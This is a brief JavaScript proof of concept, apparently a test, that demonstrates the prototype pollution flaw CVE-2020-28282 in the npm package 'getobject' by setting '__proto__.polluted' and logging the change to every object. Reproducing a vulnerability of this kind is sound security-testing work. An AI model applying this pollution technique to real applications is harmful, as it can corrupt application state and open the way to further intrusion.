// //https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28282
// test("prototype pollution in getobject", () => {
console.log({}.polluted);

  const getObject = require("getobject");
  var obj = {};
//   console.log("Before  : " + obj.polluted);
  getObject.set(obj, "__proto__.polluted", "yes");

console.log({}.polluted);
// });
